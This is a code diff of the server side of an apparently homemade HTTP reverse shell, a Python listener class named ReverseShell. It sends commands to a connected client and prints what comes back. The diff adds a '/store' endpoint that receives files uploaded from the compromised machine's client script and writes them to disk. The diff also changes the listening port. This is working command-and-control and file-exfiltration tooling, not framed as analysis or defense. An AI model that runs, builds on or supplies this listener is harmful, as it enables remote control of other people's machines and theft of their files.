@@ -3,7 +3,7 @@ import http.server
 import cgi
 from colorama import Fore, Back, Style
 
-PORT = 8080
+PORT = 8088
 
 
 class ReverseShell(http.server.BaseHTTPRequestHandler):
@@ -22,21 +22,32 @@ class ReverseShell(http.server.BaseHTTPRequestHandler):
         self.wfile.write(command.encode())
 
     def do_POST(self):
+        if self.path == '/store':  # Check whether /store is appended or not
+
+            ctype, _ = cgi.parse_header(
+                self.headers['content-type'])
+            if ctype == 'multipart/form-data':
+                fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={
+                    'REQUEST_METHOD': 'POST'})
+
+            # Here file is the key to hold the actual file, same key as the one set in client.py
+            fs_up = fs['file']
+
+            # Create new file and write contents into this file
+            with open(fs_up.filename, '+wb') as o:
+                o.write(fs_up.file.read())
+                self.send_response(200)
+                self.end_headers()
+            return
         self.send_response(200)
         self.end_headers()
         # Define the length which means how many bytes the HTTP POST data contains
         length = int(self.headers['Content-Length'])
 
-        # Read post then print the posted data
         postVar = self.rfile.read(length).decode()
-        file_loc = postVar.find("filename")
-        if file_loc != -1:
-            filename = postVar[file_loc+8:].split('"')[1]
 
-            with open(filename, "+w") as f:
-                f.write(postVar)
-        # print(Fore.GREEN + postVar, end='')
-        # print(Style.RESET_ALL)
+        print(Fore.GREEN + postVar, end='')
+        print(Style.RESET_ALL)
 
 
 with socketserver.TCPServer(("", PORT), ReverseShell) as httpd:
